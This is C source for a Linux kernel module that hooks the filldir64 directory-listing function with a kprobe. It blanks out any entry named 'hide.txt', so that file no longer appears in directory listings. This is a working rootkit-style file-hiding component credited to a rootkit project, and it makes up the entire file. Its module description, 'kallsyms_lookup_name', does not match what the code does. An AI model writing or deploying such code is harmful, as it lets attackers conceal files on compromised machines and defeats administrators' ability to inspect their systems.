// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://github.com/c3l3si4n/robson
 */

#define pr_fmt(fmt) "%s: " fmt, __func__
#define HIDE "hide.txt"

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name = "filldir64",
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;

	dbg_print(
		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
		regs->flags);
	if (strcmp(filename, HIDE) == 0)
		strcpy((char *)regs->si, "\x00");

	return 0;
}

static int __init files_hook_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp.addr);
	return 0;
}

static void __exit files_hook_exit(void)
{
	unregister_kprobe(&kp);
	pr_info("files_hook exit successfully\n");
}

module_init(files_hook_init) module_exit(files_hook_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("kallsyms_lookup_name");
MODULE_LICENSE("GPL");
